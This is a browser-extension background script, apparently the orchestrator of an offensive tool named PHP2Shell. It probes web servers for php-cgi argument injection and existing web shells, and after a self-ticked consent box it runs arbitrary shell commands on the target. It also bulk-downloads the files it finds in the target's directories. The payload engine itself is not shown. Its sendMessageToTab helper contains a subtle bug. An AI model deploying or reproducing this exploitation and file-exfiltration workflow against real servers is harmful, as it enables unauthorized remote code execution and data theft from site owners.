/* =============================================================================
 *  PHP2Shell Extension — background orchestrator
 * =============================================================================
 *
 *  ⚠️  AUTHORIZED USE ONLY
 *  -----------------------------------------------------------------------------
 *  This service worker is the only component allowed to talk to the network.
 *  It:
 *    • fingerprints the target (headers, DOM, URL) — passive,
 *    • actively probes for php-cgi argument injection / web shells — only after
 *      the operator explicitly ticks the "I am authorized to test this system"
 *      box in the popup,
 *    • executes commands ONLY through a vector that was proven against the very
 *      same origin the operator scanned.
 *
 *  Security invariants enforced here (the popup cannot break them):
 *    1. ORIGIN LOCK — the target origin is fixed at scan time. Every request
 *       goes to that origin. There is no message that can make this worker
 *       fetch an arbitrary URL.
 *    2. VECTOR LOCK — commands are executed through `state.report.vector`,
 *       which is set exclusively by a successful probe. The popup only ever
 *       sends a command STRING.
 *    3. CONSENT LOCK — active probing and command execution require an
 *       explicit authorization flag that only the operator can set.
 *    4. NO TELEMETRY — nothing is ever sent anywhere except the target host.
 *
 *  Runs as a Manifest V3 service worker (Chrome) and as a non-persistent event
 *  page (Firefox). `importScripts()` works in both.
 * =============================================================================
 */

/* global P2SEngine */

/* The engine is a plain UMD file so the exact same code runs here and under
 * Node (see tests/). */
try {
  importScripts('core/engine.js');
} catch (e) {
  /* Firefox event pages also support importScripts; if anything goes wrong we
   * fall back to the global that may already have been installed. */
  if (typeof P2SEngine === 'undefined') {
    console.error('[P2S] core engine failed to load', e);
  }
}

(function () {
  'use strict';

  var ENGINE = (typeof P2SEngine !== 'undefined') ? P2SEngine : null;

  var STORAGE_KEY = 'p2s_state';
  var LOG_KEY = 'p2s_log';
  var MAX_LOG = 250;

  /* ---------------------------------------------------------------------------
   * In-memory state + persistence
   * ------------------------------------------------------------------------ */

  var state = {
    status: 'idle',              /* idle | scanning | vulnerable | suspicious | secure | error */
    target: null,                /* { url, origin, host, path }                   */
    report: null,                /* full scan report                              */
    authorized: false,           /* operator ticked the consent box              */
    scannedAt: null,
    lastError: null
  };

  var memoryLog = [];

  function now() { return Date.now(); }

  function storageArea() {
    try {
      if (chrome.storage && chrome.storage.session) return chrome.storage.session;
    } catch (e) { /* ignore */ }
    try {
      if (chrome.storage && chrome.storage.local) return chrome.storage.local;
    } catch (e) { /* ignore */ }
    return null;
  }

  function areaGet(area, key) {
    return new Promise(function (resolve) {
      try {
        var maybe = area.get(key, function (items) { resolve(items || {}); });
        if (maybe && typeof maybe.then === 'function') maybe.then(function (items) { resolve(items || {}); }, function () { resolve({}); });
      } catch (e) { resolve({}); }
    });
  }

  function areaSet(area, key, value) {
    return new Promise(function (resolve) {
      try {
        var maybe = area.set({ [key]: value }, function () { resolve(true); });
        if (maybe && typeof maybe.then === 'function') maybe.then(function () { resolve(true); }, function () { resolve(false); });
      } catch (e) { resolve(false); }
    });
  }

  function persistState() {
    var area = storageArea();
    if (!area) return Promise.resolve(false);
    return areaSet(area, STORAGE_KEY, state);
  }

  function loadPersistedState() {
    var area = storageArea();
    if (!area) return Promise.resolve(state);
    return areaGet(area, STORAGE_KEY).then(function (items) {
      var saved = items && items[STORAGE_KEY];
      if (saved && typeof saved === 'object') {
        state = Object.assign({}, state, saved);
      }
      return state;
    });
  }

  /* ---------------------------------------------------------------------------
   * Audit log
   * ------------------------------------------------------------------------ */

  function log(level, message, detail) {
    var entry = { ts: now(), level: level, message: message, detail: detail || '' };
    memoryLog.unshift(entry);
    if (memoryLog.length > MAX_LOG) memoryLog.length = MAX_LOG;

    try {
      var area = (chrome.storage && chrome.storage.local) ? chrome.storage.local : storageArea();
      if (area) {
        areaGet(area, LOG_KEY).then(function (items) {
          var existing = (items && items[LOG_KEY]) || [];
          existing.unshift(entry);
          if (existing.length > MAX_LOG) existing.length = MAX_LOG;
          areaSet(area, LOG_KEY, existing);
        });
      }
    } catch (e) { /* logging must never break the flow */ }

    return entry;
  }

  function getLog() {
    var area = (chrome.storage && chrome.storage.local) ? chrome.storage.local : storageArea();
    if (!area) return Promise.resolve(memoryLog);
    return areaGet(area, LOG_KEY).then(function (items) {
      var stored = (items && items[LOG_KEY]) || [];
      return stored.length ? stored : memoryLog;
    });
  }

  function clearLog() {
    memoryLog = [];
    var area = (chrome.storage && chrome.storage.local) ? chrome.storage.local : storageArea();
    if (area) areaSet(area, LOG_KEY, []);
    return Promise.resolve(true);
  }

  /* ---------------------------------------------------------------------------
   * Helpers
   * ------------------------------------------------------------------------ */

  function sendMessageToTab(tabId, message) {
    return new Promise(function (resolve) {
      try {
        chrome.tabs.sendMessage(tabId, message, function (resolve) {
          void chrome.runtime.lastError;
          resolve(resolve);
        });
      } catch (e) { resolve(null); }
    });
  }

  /** Inject the DOM fingerprinting content script and read its result back. */
  function domScan(tabId) {
    if (typeof tabId !== 'number' || tabId < 0) return Promise.resolve(null);
    return new Promise(function (resolve) {
      try {
        chrome.scripting.executeScript({
          target: { tabId: tabId, frameIds: [0] },
          files: ['content.js']
        }, function (afterInject) {
          void chrome.runtime.lastError;
          if (chrome.runtime.lastError) { resolve(null); return; }
          chrome.scripting.executeScript({
            target: { tabId: tabId, frameIds: [0] },
            func: function () {
              try {
                if (typeof globalThis.__P2S_SCAN_FN__ === 'function') return globalThis.__P2S_SCAN_FN__();
                return globalThis.__P2S_SCAN__ || null;
              } catch (e) {
                return { error: String((e && e.message) || e) };
              }
            }
          }, function (results) {
            void chrome.runtime.lastError;
            var out = null;
            if (results && results.length) out = results[0].result;
            resolve(out || null);
          });
        });
      } catch (e) { resolve(null); }
    });
  }

  /** Severity ranking used to summarise a verdict. */
  function severityRank(s) {
    return { critical: 4, high: 3, medium: 2, low: 1, info: 0 }[s] || 0;
  }

  function worstSeverity(evidence) {
    var worst = 'info';
    (evidence || []).forEach(function (e) {
      if (severityRank(e.severity) > severityRank(worst)) worst = e.severity;
    });
    return worst;
  }

  /* ---------------------------------------------------------------------------
   * The scan
   * ------------------------------------------------------------------------ */

  function runScan(opts) {
    var engine = ENGINE;
    var tabId = opts.tabId;
    var url = opts.url;
    var deep = !!opts.deep;
    var authorized = !!opts.authorized;

    if (!engine) {
      state.status = 'error';
      state.lastError = 'core engine unavailable';
      persistState();
      return Promise.resolve({ ok: false, error: 'core engine unavailable' });
    }

    var analysis = engine.analyzeUrl(url);
    if (!analysis) {
      state.status = 'error';
      state.lastError = 'Unsupported URL (only http/https can be scanned).';
      state.target = null;
      state.report = null;
      persistState();
      log('warn', 'Scan rejected', state.lastError);
      return Promise.resolve({ ok: false, error: state.lastError });
    }

    var target = analysis.target;
    var evidence = analysis.evidence.slice();

    state.status = 'scanning';
    state.target = { url: target.url, origin: target.origin, host: target.host, path: target.path };
    state.report = null;
    state.lastError = null;
    state.authorized = authorized;
    state.scannedAt = now();
    persistState();

    log('info', 'Scan started', target.url);

    var steps = [];
    var domFindings = [];

    /* --- Step 1: DOM fingerprint --------------------------------------- */
    return domScan(tabId).then(function (dom) {
      if (dom && Array.isArray(dom.findings)) {
        dom.findings.forEach(function (f) { evidence.push(f); });
        domFindings = dom.findings;
        steps.push('dom:' + dom.findings.length);
      } else {
        steps.push('dom:skipped');
      }

      /* --- Step 2: passive header / body fingerprint -------------------- */
      return engine.getProbe({ url: target.url, timeoutMs: 8000 });
    }).then(function (passive) {
      if (passive && passive.headers) {
        engine.phpHeaderEvidence(passive.headers).forEach(function (e) { evidence.push(e); });
      }
      if (passive && passive.body) {
        var errRe = /PHP (Parse error|Fatal error|Warning|Notice)\b|Uncaught \w*Exception|Stack trace:\s*#0|\/var\/www\/|\/home\/[a-z0-9_-]+\/public_html/g;
        var m;
        var n = 0;
        while ((m = errRe.exec(passive.body)) !== null && n < 10) {
          n++;
          if (n === 1) {
            evidence.push({
              type: 'body', severity: 'medium',
              title: 'PHP error output in the live response',
              detail: 'The server returned a raw PHP error banner: "' + engine.truncate(m[0], 60) + '".',
              sample: engine.truncate(passive.body.substr(Math.max(0, m.index - 40), 160), 160)
            });
          }
        }
      }
      steps.push('passive:' + (passive && passive.status ? passive.status : 'err'));

      /* --- Step 3: active probing (consent-gated) ----------------------- */
      if (!authorized) {
        steps.push('active:skipped(no-consent)');
        return { vector: null, strategy: null };
      }

      var token = engine.randomToken(10);
      var scripts = engine.candidateScripts(target).map(function (p) {
        return new URL(p, target.origin).href;
      });
      steps.push('scripts:' + scripts.length);

      /* Strategy A — an already-planted command channel. */
      var shellScripts = scripts.slice(0, 1);
      domFindings.forEach(function (f) {
        if (!f || !Array.isArray(f.links)) return;
        f.links.forEach(function (href) {
          try {
            var u = new URL(href, target.origin);
            if (u.origin !== target.origin) return;   /* origin lock */
            if (!/\.php/i.test(u.pathname)) return;
            if (shellScripts.indexOf(u.href) === -1) shellScripts.push(u.href);
          } catch (e) { /* ignore */ }
        });
      });
      steps.push('shell-scripts:' + shellScripts.length);

      return engine.probeExistingShell({
        target: target,
        token: token,
        script: shellScripts[0],
        scripts: shellScripts,
        fetchImpl: typeof fetch !== 'undefined' ? fetch.bind(globalThis) : null,
        timeoutMs: deep ? 10000 : 7000,
        maxParams: deep ? 10 : 6
      }).then(function (resA) {
        if (resA && resA.found) {
          steps.push('strategy:existing-shell');
          return { vector: resA.vector, strategy: resA.strategy, evidence: resA.evidence || [], tried: resA.tried };
        }
        steps.push('strategy:existing-shell(miss)');

        /* Strategy B — php-cgi argument injection. */
        return engine.probeInjection({
          scripts: scripts,
          token: token,
          vectors: engine.INJECTION_VECTORS,
          fetchImpl: typeof fetch !== 'undefined' ? fetch.bind(globalThis) : null,
          timeoutMs: deep ? 10000 : 7000
        }).then(function (resB) {
          if (resB && resB.found) {
            steps.push('strategy:cgi-injection');
            return { vector: resB.vector, strategy: resB.strategy, evidence: resB.evidence || [], tried: resB.tried };
          }
          steps.push('strategy:cgi-injection(miss)');
          return { vector: null, strategy: null, evidence: [], tried: (resB && resB.tried) || [] };
        });
      });
    }).then(function (active) {
      if (active && active.evidence) active.evidence.forEach(function (e) { evidence.push(e); });

      var vector = active ? active.vector : null;
      var verdict;
      var severity;

      if (vector) {
        verdict = 'vulnerable';
        severity = 'critical';
        evidence.unshift({
          type: 'verdict', severity: 'critical',
          title: 'PHP2Shell — arbitrary PHP execution confirmed',
          detail: 'The server executed attacker-supplied PHP code. This is a confirmed remote code execution condition (' +
            (vector.name || vector.id) + ').'
        });
      } else {
        var worst = worstSeverity(evidence);
        severity = worst;
        if (worst === 'critical' || worst === 'high') {
          verdict = 'suspicious';
          evidence.unshift({
            type: 'verdict', severity: 'high',
            title: 'Strong indicators, but execution not confirmed',
            detail: 'The page exposes code-execution primitives, yet no live probe confirmed arbitrary execution. ' +
              (authorized ? 'The endpoint may already be patched, or the vector may be different.' :
                'Tick "authorized" and re-scan to run an active verification probe.')
          });
        } else if (worst === 'medium' || worst === 'low') {
          verdict = 'suspicious';
          evidence.unshift({
            type: 'verdict', severity: 'medium',
            title: 'Weak indicators only',
            detail: 'Nothing conclusive was found. The host looks like a normal PHP application.'
          });
        } else {
          verdict = 'secure';
          evidence.unshift({
            type: 'verdict', severity: 'info',
            title: 'No PHP2Shell indicators found',
            detail: 'No command channels, no leaked source, no PHP error banners and no exploitable behaviour were detected.'
          });
        }
      }

      var report = {
        verdict: verdict,
        severity: severity,
        target: { url: target.url, origin: target.origin, host: target.host, path: target.path },
        vector: vector,
        strategy: active ? active.strategy : null,
        evidence: evidence,
        steps: steps,
        scannedAt: now(),
        authorized: authorized
      };

      state.report = report;
      state.status = verdict;
      persistState();

      log(verdict === 'vulnerable' ? 'crit' : 'info',
        'Scan finished: ' + verdict,
        target.url + ' | severity=' + severity + ' | steps=' + steps.join(','));

      return { ok: true, report: report };
    }).catch(function (err) {
      var message = String((err && err.message) || err);
      state.status = 'error';
      state.lastError = message;
      persistState();
      log('error', 'Scan failed', message);
      return { ok: false, error: message };
    });
  }

  /* ---------------------------------------------------------------------------
   * Command execution
   * ------------------------------------------------------------------------ */

  function runCommand(command) {
    var engine = ENGINE;
    if (!engine) return Promise.resolve({ ok: false, error: 'core engine unavailable' });

    if (!state.report || !state.report.vector) {
      return Promise.resolve({ ok: false, error: 'No confirmed vulnerability vector — run a successful scan first.' });
    }
    if (!state.authorized) {
      return Promise.resolve({ ok: false, error: 'Authorization required — tick the consent box in the popup.' });
    }

    var cmd = engine.normalizeCommand(command);
    if (!cmd) return Promise.resolve({ ok: false, error: 'Empty command.' });

    var risk = engine.commandRisk(cmd);

    /* Re-assert the origin lock right before the request goes out. */
    var vector = state.report.vector;
    var origin = state.report.target.origin;
    var scriptUrl = new URL(vector.script || (origin + '/index.php'), origin).href;
    if (new URL(scriptUrl).origin !== origin) {
      return Promise.resolve({ ok: false, error: 'Blocked: vector escaped the locked origin.' });
    }

    log('warn', 'Command: ' + cmd, 'origin=' + origin + ' vector=' + (vector.id || vector.name || '?'));

    return engine.executeCommand({
      fetchImpl: typeof fetch !== 'undefined' ? fetch.bind(globalThis) : null,
      vector: Object.assign({}, vector, { script: scriptUrl }),
      command: cmd,
      token: engine.randomToken(8),
      timeoutMs: 20000
    }).then(function (res) {
      var raw = res.output || '';
      if (!res.extracted && res.raw) {
        /* The output delimiters were not found — show a truncated raw body so
         * the operator can see what came back. */
        raw = '(no delimited output captured)\n' + engine.truncate(res.raw, 4000);
      }

      /* Markup is reduced to readable text; the raw bytes stay available. */
      var shaped = engine.formatCommandOutput(raw);

      log('info', 'Command finished: ' + cmd, 'status=' + res.status +
          ' bytes=' + shaped.bytes + ' kind=' + shaped.kind);

      return {
        ok: !!res.ok,
        command: cmd,
        output: shaped.text,
        raw: shaped.raw,
        kind: shaped.kind,
        bytes: shaped.bytes,
        status: res.status,
        error: res.error || null,
        risk: risk
      };
    }).catch(function (err) {
      var message = String((err && err.message) || err);
      log('error', 'Command failed: ' + cmd, message);
      return { ok: false, error: message, command: cmd, risk: risk };
    });
  }

  /* ---------------------------------------------------------------------------
   * Message router
   * ------------------------------------------------------------------------ */

  /* ---------------------------------------------------------------------------
   * "Download all files" — mirror the directory a target exposes
   * ------------------------------------------------------------------------ */

  /**
   * List a directory on the target through the confirmed command channel and
   * start a browser download for every regular file that was found.
   *
   * Same guards as the console: a confirmed vector and the authorisation box.
   * The origin lock is re-asserted for every URL that is queued.
   */
  function saveAllFiles(payload) {
    var engine = ENGINE;
    if (!engine) return Promise.resolve({ ok: false, error: 'core engine unavailable' });

    if (!state.report || !state.report.vector) {
      return Promise.resolve({ ok: false, error: 'No confirmed vulnerability vector — run a successful scan first.' });
    }
    if (!state.authorized) {
      return Promise.resolve({ ok: false, error: 'Authorization required — tick the consent box in the popup.' });
    }
    if (!chrome.downloads || typeof chrome.downloads.download !== 'function') {
      return Promise.resolve({ ok: false, error: 'The downloads API is unavailable — check the "downloads" permission.' });
    }

    var origin = state.report.target.origin;
    var vector = state.report.vector;
    var scriptUrl = new URL(vector.script || (origin + '/index.php'), origin).href;
    if (new URL(scriptUrl).origin !== origin) {
      return Promise.resolve({ ok: false, error: 'Blocked: vector escaped the locked origin.' });
    }

    var dir = String((payload && payload.dir) || '').trim();
    var recursive = !!(payload && payload.recursive);
    var cmd = engine.buildListingCommand({ dir: dir, recursive: recursive });

    log('warn', 'Listing command: ' + cmd, 'origin=' + origin);

    return engine.executeCommand({
      fetchImpl: typeof fetch !== 'undefined' ? fetch.bind(globalThis) : null,
      vector: Object.assign({}, vector, { script: scriptUrl }),
      command: cmd,
      token: engine.randomToken(8),
      timeoutMs: 30000
    }).then(function (res) {
      if (!res || !res.ok) {
        return { ok: false, error: (res && res.error) || 'the listing command failed' };
      }

      var parsed = engine.parseListingOutput(res.output || '');
      if (!parsed.entries.length) {
        return {
          ok: false,
          error: 'Nothing parseable came back — is `ls` available to the web user?',
          raw: engine.truncate(res.raw || '', 2000)
        };
      }

      var stamp = new Date().toISOString().replace(/[-:T]/g, '').slice(0, 14);
      var rootName = 'p2s-' + String(origin).replace(/^https?:\/\//, '').replace(/[^A-Za-z0-9._-]+/g, '_') + '-' + stamp;

      var plan = engine.buildDownloadPlan({
        origin: origin,
        docroot: parsed.meta.docroot,
        cwd: parsed.meta.cwd,
        scriptName: parsed.meta.script || scriptUrl,
        entries: parsed.entries,
        rootName: rootName
      });

      if (!plan.files.length) {
        return {
          ok: false,
          error: 'The listing contains no downloadable regular files.',
          skipped: plan.skipped,
          listed: parsed.entries.length
        };
      }

      /* Every queued URL must still be on the locked origin. */
      var safe = [];
      plan.files.forEach(function (f) {
        try {
          if (new URL(f.url).origin !== origin) {
            plan.skipped.push({ name: f.name, reason: 'off-origin' });
            return;
          }
          safe.push(f);
        } catch (e) {
          plan.skipped.push({ name: f.name, reason: 'invalid URL' });
        }
      });

      var started = 0;
      var failed = [];

      return safe.reduce(function (chain, f) {
        return chain.then(function () {
          return new Promise(function (resolve) {
            var settled = false;
            var done = function (id) {
              if (settled) return;
              settled = true;
              void chrome.runtime.lastError;
              if (id === undefined || id === null) failed.push(f.name);
              else started++;
              resolve();
            };
            try {
              chrome.downloads.download({
                url: f.url,
                filename: f.filename,
                conflictAction: 'uniquify',
                saveAs: false
              }, done);
            } catch (e) {
              failed.push(f.name);
              resolve();
            }
          });
        });
      }, Promise.resolve()).then(function () {
        log('info', 'Queued ' + started + '/' + safe.length + ' download(s) from ' + origin, 'docroot=' + (parsed.meta.docroot || '?'));
        return {
          ok: true,
          listed: parsed.entries.length,
          files: safe,
          skipped: plan.skipped,
          started: started,
          failed: failed,
          docroot: parsed.meta.docroot,
          cwd: parsed.meta.cwd,
          rootName: rootName
        };
      });
    }).catch(function (err) {
      var message = String((err && err.message) || err);
      log('error', 'Download-all failed: ' + message);
      return { ok: false, error: message };
    });
  }

  /* ---------------------------------------------------------------------------
   * Message handlers
   * ------------------------------------------------------------------------ */

  var handlers = {
    P2S_GET_STATE: function () {
      return Promise.resolve({ ok: true, state: state, engineVersion: ENGINE ? ENGINE.ENGINE_VERSION : null });
    },

    P2S_SCAN: function (msg) {
      var p = msg.payload || {};
      return runScan({
        tabId: p.tabId,
        url: p.url,
        deep: !!p.deep,
        authorized: !!p.authorized
      });
    },

    P2S_SET_AUTH: function (msg) {
      state.authorized = !!(msg.payload && msg.payload.authorized);
      persistState();
      log('info', 'Authorization ' + (state.authorized ? 'GRANTED' : 'revoked'));
      return Promise.resolve({ ok: true, authorized: state.authorized });
    },

    P2S_CHECK_CMD: function (msg) {
      /* Risk assessment happens HERE so the popup and the worker always agree
       * on what counts as destructive. */
      var engine = ENGINE;
      var cmd = engine ? engine.normalizeCommand(msg.payload && msg.payload.command) : '';
      return Promise.resolve({ ok: true, risk: engine ? engine.commandRisk(cmd) : { dangerous: false, reasons: [] } });
    },

    P2S_EXEC: function (msg) {
      return runCommand(msg.payload && msg.payload.command);
    },

    P2S_SAVE_ALL: function (msg) {
      return saveAllFiles(msg.payload || {});
    },

    P2S_RESET: function () {
      state.status = 'idle';
      state.target = null;
      state.report = null;
      state.lastError = null;
      state.scannedAt = null;
      persistState();
      return Promise.resolve({ ok: true });
    },

    P2S_LOG: function () {
      return getLog().then(function (entries) { return { ok: true, entries: entries }; });
    },

    P2S_CLEAR_LOG: function () {
      return clearLog().then(function () { return { ok: true }; });
    }
  };

  if (chrome.runtime && chrome.runtime.onMessage) {
    chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
      var type = message && message.type;
      var handler = handlers[type];
      if (!handler) return false;
      Promise.resolve()
        .then(function () { return handler(message, sender); })
        .then(function (result) { sendResponse(result); })
        .catch(function (err) {
          sendResponse({ ok: false, error: String((err && err.message) || err) });
        });
      return true; /* keep the message channel open for the async response */
    });
  }

  /* ---------------------------------------------------------------------------
   * Lifecycle
   * ------------------------------------------------------------------------ */

  if (chrome.runtime && chrome.runtime.onInstalled) {
    chrome.runtime.onInstalled.addListener(function (details) {
      log('info', 'Extension ' + (details.reason || 'installed'), 'v' + (ENGINE ? ENGINE.ENGINE_VERSION : '?'));
      loadPersistedState();
    });
  }

  if (chrome.runtime && chrome.runtime.onStartup) {
    chrome.runtime.onStartup.addListener(function () {
      loadPersistedState();
      log('info', 'Browser started — session state restored');
    });
  }

  /* Invalidate the locked target when the user navigates somewhere else. */
  if (chrome.tabs && chrome.tabs.onUpdated) {
    chrome.tabs.onUpdated.addListener(function (tabId, changeInfo) {
      if (!changeInfo.url || !state.target) return;
      try {
        var u = new URL(changeInfo.url);
        if (u.origin !== state.target.origin && state.status !== 'idle') {
          state.status = 'idle';
          state.report = null;
          state.target = null;
          persistState();
          log('warn', 'Target lock released (navigated to a different origin)');
        }
      } catch (e) { /* ignore */ }
    });
  }

  /* Track the outcome of every download the "download all" button queued. */
  if (chrome.downloads && chrome.downloads.onChanged) {
    chrome.downloads.onChanged.addListener(function (delta) {
      if (!delta || !delta.state) return;
      if (delta.state.current !== 'complete' && delta.state.current !== 'interrupted') return;

      try {
        chrome.downloads.search({ id: delta.id }, function (items) {
          void chrome.runtime.lastError;
          var item = (items && items[0]) || null;
          if (!item) return;
          var what = item.filename || String(delta.id);
          if (delta.state.current === 'interrupted') {
            log('warn', 'Download interrupted: ' + what, item.error || '');
          } else {
            var bytes = (item.fileSize >= 0) ? (item.fileSize + ' bytes') : 'size unknown';
            log('info', 'Downloaded: ' + what, bytes + (item.mime ? ' · ' + item.mime : ''));
          }
        });
      } catch (e) { /* ignore */ }
    });
  }

  loadPersistedState();
})();
